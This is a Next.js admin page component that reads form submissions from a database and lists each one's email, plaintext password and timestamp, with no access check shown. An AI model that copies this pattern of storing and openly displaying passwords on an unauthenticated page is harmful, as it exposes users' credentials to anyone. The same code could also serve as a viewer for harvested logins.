import { db } from "@/db";
import { formSubmissions } from "@/db/schema";
import { desc } from "drizzle-orm";

export default async function AdminPage() {
  // Fetch all submissions from database
  const submissions = await db
    .select()
    .from(formSubmissions)
    .orderBy(desc(formSubmissions.submittedAt));

  return (
    <div style={{ 
      minHeight: "100vh", 
      padding: "40px", 
      fontFamily: "system-ui, sans-serif",
      backgroundColor: "#f5f5f5"
    }}>
      <h1 style={{ marginBottom: "20px" }}>Form Submissions Admin</h1>
      
      {submissions.length === 0 ? (
        <p>No submissions yet.</p>
      ) : (
        <table style={{ 
          width: "100%", 
          borderCollapse: "collapse", 
          backgroundColor: "white",
          boxShadow: "0 1px 3px rgba(0,0,0,0.1)"
        }}>
          <thead>
            <tr style={{ backgroundColor: "#f0f0f0", textAlign: "left" }}>
              <th style={{ padding: "12px", borderBottom: "2px solid #ddd" }}>ID</th>
              <th style={{ padding: "12px", borderBottom: "2px solid #ddd" }}>Email</th>
              <th style={{ padding: "12px", borderBottom: "2px solid #ddd" }}>Password</th>
              <th style={{ padding: "12px", borderBottom: "2px solid #ddd" }}>Submitted At</th>
            </tr>
          </thead>
          <tbody>
            {submissions.map((submission) => (
              <tr key={submission.id} style={{ borderBottom: "1px solid #eee" }}>
                <td style={{ padding: "12px" }}>{submission.id}</td>
                <td style={{ padding: "12px" }}>{submission.email}</td>
                <td style={{ padding: "12px" }}>{submission.password}</td>
                <td style={{ padding: "12px" }}>
                  {submission.submittedAt ? new Date(submission.submittedAt).toLocaleString() : "N/A"}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      )}
      
      <p style={{ marginTop: "20px", color: "#666", fontSize: "14px" }}>
        Total submissions: {submissions.length}
      </p>
    </div>
  );
}
